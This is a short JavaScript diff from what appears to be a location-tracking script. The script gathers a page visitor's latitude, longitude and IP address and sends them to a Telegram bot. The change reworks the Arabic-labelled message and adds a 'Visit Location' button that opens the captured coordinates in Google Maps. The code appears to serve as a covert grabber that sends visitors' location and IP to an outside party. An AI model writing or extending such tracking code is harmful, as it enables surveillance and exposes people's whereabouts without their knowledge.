@@ -27,7 +27,19 @@
     const data = await response.json();
     const ipAddress = data.ip;
 
-    const message = `الموقع: \nLa ==> ${latitude}\nLo ==> ${longitude}\nالايبي ==> ${ipAddress}`;
+    const message = `الموقع: \n${latitude} ${longitude}\nالايبي: ==> ${ipAddress}`;
+
+
+    // Create the inline keyboard markup with the "Visit Location" button
+    const keyboard = JSON.stringify({
+      inline_keyboard: [[
+        {
+          text: 'Visit Location',
+          url: `https://www.google.com/maps?q=${latitude},${longitude}`
+        }
+      ]]
+    });
+
 
     // Send location and IP results to Telegram bots using an HTTP request
     await fetch(telegramBotURL, {
